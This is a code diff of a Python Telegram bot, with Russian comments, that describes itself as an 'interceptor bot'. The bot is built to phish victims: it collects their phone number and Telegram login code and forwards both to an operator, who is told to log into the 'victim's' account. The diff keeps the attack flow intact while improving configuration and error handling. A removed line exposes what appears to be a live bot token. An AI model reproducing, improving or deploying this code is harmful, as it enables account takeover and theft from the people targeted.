@@ -4,17 +4,34 @@ import time
 import sqlite3
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# ТВОИ ДАННЫЕ
-BOT_TOKEN = '8417861367:AAHqaOm1aE5uDBCmLo6AqalwZ2bCxivrsOA'  # твой токен
-ADMIN_ID = ТВОЙ_ID  # твой chat_id
+# Читаем переменные из Railway
+BOT_TOKEN = os.environ.get('BOT_TOKEN')
+ADMIN_ID = os.environ.get('ADMIN_ID')
+
+if not BOT_TOKEN or not ADMIN_ID:
+    print("❌ Ошибка: Добавь BOT_TOKEN и ADMIN_ID в Variables на Railway!")
+    print("📝 Как добавить:")
+    print("1. Зайди в проект на Railway")
+    print("2. Вкладка Variables")
+    print("3. Добавь BOT_TOKEN и ADMIN_ID")
+    exit(1)
+
+# Преобразуем ADMIN_ID в число
+try:
+    ADMIN_ID = int(ADMIN_ID)
+except:
+    print("❌ Ошибка: ADMIN_ID должен быть числом!")
+    exit(1)
 
 bot = telebot.TeleBot(BOT_TOKEN)
+print(f"✅ Бот запущен!")
+print(f"👤 Админ ID: {ADMIN_ID}")
 
 # База данных
 conn = sqlite3.connect('attacks.db', check_same_thread=False)
 cursor = conn.cursor()
 cursor.execute('''CREATE TABLE IF NOT EXISTS attacks
-                  (victim_id INTEGER PRIMARY KEY AUTOINCREMENT,
+                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                    phone TEXT,
                    victim_user_id INTEGER,
                    code TEXT,
@@ -105,8 +122,7 @@ def process_username(message):
                 ADMIN_ID,
                 f"✅ Сообщение отправлено пользователю {username}\n"
                 f"ID атаки: {attack_id}\n\n"
-                f"Теперь пытайся войти в аккаунт жертвы!\n"
-                f"Когда получишь код - жми /getcode {attack_id}",
+                f"Теперь пытайся войти в аккаунт жертвы!",
                 parse_mode="Markdown"
             )
             
@@ -198,8 +214,7 @@ def victim_enter_phone(message, attack_id):
         f"👤 *Жертва готова!*\n"
         f"ID атаки: {attack_id}\n"
         f"Телефон: {phone}\n\n"
-        f"Теперь пытайся войти в аккаунт!\n"
-        f"Когда получишь код - жми /getcode {attack_id}",
+        f"Теперь пытайся войти в аккаунт!",
         parse_mode="Markdown"
     )
 
@@ -243,7 +258,11 @@ def victim_approve_code(call):
     
     # Получаем код из базы
     cursor.execute("SELECT code, phone FROM attacks WHERE id = ?", (attack_id,))
-    code, phone = cursor.fetchone()
+    result = cursor.fetchone()
+    if not result:
+        return
+    
+    code, phone = result
     
     # Отправляем код админу (ТЕБЕ!)
     bot.send_message(
@@ -267,11 +286,11 @@ def victim_approve_code(call):
     cursor.execute("UPDATE attacks SET status = 'completed' WHERE id = ?", (attack_id,))
     conn.commit()
 
-# ========== КОМАНДЫ ДЛЯ АДМИНА (ПОЛУЧЕНИЕ КОДА) ==========
+# ========== КОМАНДЫ ДЛЯ АДМИНА ==========
 
 @bot.message_handler(commands=['getcode'])
 def admin_get_code(message):
-    """Команда для принудительного получения кода"""
+    """Команда для получения кода"""
     if message.from_user.id != ADMIN_ID:
         return
     
@@ -279,9 +298,9 @@ def admin_get_code(message):
         attack_id = int(message.text.split()[1])
         
         cursor.execute("SELECT code, phone FROM attacks WHERE id = ?", (attack_id,))
-        code, phone = cursor.fetchone()
-        
-        if code:
+        result = cursor.fetchone()
+        if result:
+            code, phone = result
             bot.send_message(
                 ADMIN_ID,
                 f"🔑 Код для атаки {attack_id}:\n"
@@ -319,7 +338,8 @@ def show_active_attacks():
     
     bot.send_message(ADMIN_ID, text, parse_mode="Markdown")
 
-print("🤖 Бот-перехватчик запущен!")
-print(f"👤 Админ: {ADMIN_ID}")
-print("🎯 Режим: ты вводишь номер → бот пишет жертве → ты получаешь код")
-bot.polling()
+if __name__ == "__main__":
+    print("🤖 Бот-перехватчик запущен!")
+    print(f"👤 Админ ID: {ADMIN_ID}")
+    print("🎯 Режим: ты вводишь номер → бот пишет жертве → ты получаешь код")
+    bot.polling()
